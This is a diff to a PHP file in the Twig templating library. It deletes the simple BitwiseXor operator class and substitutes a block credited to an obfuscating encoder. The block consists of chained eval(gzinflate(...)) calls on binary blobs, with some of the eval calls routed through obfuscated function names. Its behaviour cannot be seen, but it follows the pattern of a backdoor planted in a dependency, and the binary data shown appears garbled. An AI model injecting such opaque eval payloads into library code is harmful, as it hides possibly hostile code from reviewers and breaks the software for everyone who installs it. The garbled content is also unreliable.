@@ -1,18 +1,12 @@
 <?php
-
-/*
- * This file is part of Twig.
- *
- * (c) 2009 Fabien Potencier
- * (c) 2009 Armin Ronacher
- *
- * For the full copyright and license information, please view the LICENSE
- * file that was distributed with this source code.
- */
-class Twig_Node_Expression_Binary_BitwiseXor extends Twig_Node_Expression_Binary
-{
-    public function operator(Twig_Compiler $compiler)
-    {
-        return $compiler->raw('^');
-    }
-}
+ /*
+|#| Message      : Copying or sharing of this file is illegal!
+|#| Product      : SiiKUN PRO PHP Encoder & Obfuscator
+|#| Author       : SiiKUN TM
+|#| URL          : https://github.com/karyakode/siikunpro
+*/
+eval(gzinflate("­–ûO’aÇÿ•'†“·×šx«¦ø¨9/l7Àærn\"j%j^@Å·0	Ô‘šŠ·P£›…–\"h†—Ãâtj3ì}Qg¿‡­ŞËÙçœç{¾Ï9¯PÀ¹!(åH…¢L~‘P\"•p¢­Kù­µiÃ“Šh‚(¾ú]ÿÌa»–Ü½m‹ÇeÕÊm‹Ñµèô–S‹¦Ní¢ÿÓşêabŸÉ+Í¡•Ú°Ü¸ÿÛĞ¸¹ıãåğèÌX]è<8ãò. b¥sâÒ‹’î¥İ‰Oç&&Ò—şsù0Ÿï²hÖm˜ò¼÷ü•7½	N·fG7«ëŞNí-÷4É¾úhV,Š‘P€8`0€&fgIøI	™¹üœ‚\\>G\"‹ùá“D2*Aìà‘]å>›ĞŸí¶î6ÚÊ^}ÎkN–V›<ÍJ¥’*£ù41Ÿ/Â &#¶l|ÆÑrR»s¢¶:ö'}®Ÿî6«Æ×ßgĞŒË^0¸ÂlšˆÕ°¸[(‘ÉŠ!~ÖØº7²àUÇ”§ßñnõÊœÔñ†î`m uóÀ4ïV>¡JïL»ÿh™‘Á}1®;(İ·:SÍ‚¢¡Ïb+­7—kf5ç§®¶©íè³ÓZç°¯îh[æW:NzòÃú¹ó^ÇfHİª±QŒ©Y4K®šônõË¬ºàd÷“ıÔÌÈi—Ù0m÷ûO«ì²YÇMF‚Z¹
+¯RkëuZTíŠş9¿åĞ&*U!ßqµŞ³©hyì×§ëfyg‡©Âh³êÍ*m­Ç©šè6ú—=5¶oğb“AJ
+¨Ì ÉğÕuºÍC9ybN8>ÌšA û(Ì‚.A¨If0Î		(ñx<ÚhÌ‰áPËÜú,åeIò8,I^—ÆÿÏ%ìY§É½2öüznQŒtuUvëGİ”¢Ê×¬şNÙB“x>‚®'¶À»té£‹æC&#A¢ã	ß–ğ—4¸Ë(%vã
+Ê‰RSqQà@‚Ş	‹øEa¡ =#@Azb¢0õÄ°‰1—H¸n:†Káê1Êgü‹…â\"Â÷*àMŒfğÀ€‹bªŠ'ñú@’‘,1põG´äÂyAW]/O8ôjyŠùÒB±=x\$	ò³¤|¸\"˜wí’¿"));eval(¾ÚÓÔéàÍ¦ˆ…("üCødĞPš|'Î…œ|°2y4YÀšßw¶lÄã³n4/ÉÜÆİ®ŸÃ ¥b4ˆ>ö¢ÙâÆ.Zİ*6Ğz+óKV8'ŞÛ™øj*ÊÉÛ@İç6{7sâÉî¤†LğâĞœBm¢íCDä×re¹ë´Ûj­8‚Pø!Jç&-Ì_Y›!ÂÎxN®ŠĞ¶)ƒÙJÔ#r6)D›ŠSGGm
+æã=\$Vj–Ac:I›oÓdl_én\\n!"));eval(ÕëòüóöèŸ€ê¼Õ¦Úä("éˆÑä„–£—›´£İàŠÏî´…Íş«¥ßô–İèĞëúŠ¤¥ô‹Ïí·ÄŠÜÅš”Ğ¼æ¤½ğYÉUÉ_KMFö8¾¼î°¸pe)ÄÛlµ	QÖ³Ë Óù#8ô]#§•‹Atê>™®ºYÕ\"¿›V\"Ä¬†fæ‡HRTÑá[ªn3;+Ä4/0€`ÿ!ÖôÃ/’ç÷7’Áìª5­.“«x·!kXÔcğ×h`3JP_èÈÚóËùôŒ’ë½®Ôè·°î§¦Ó æ¿ı¯„ší³ëºàÖáôÀŸßáˆÖã†²"));?>
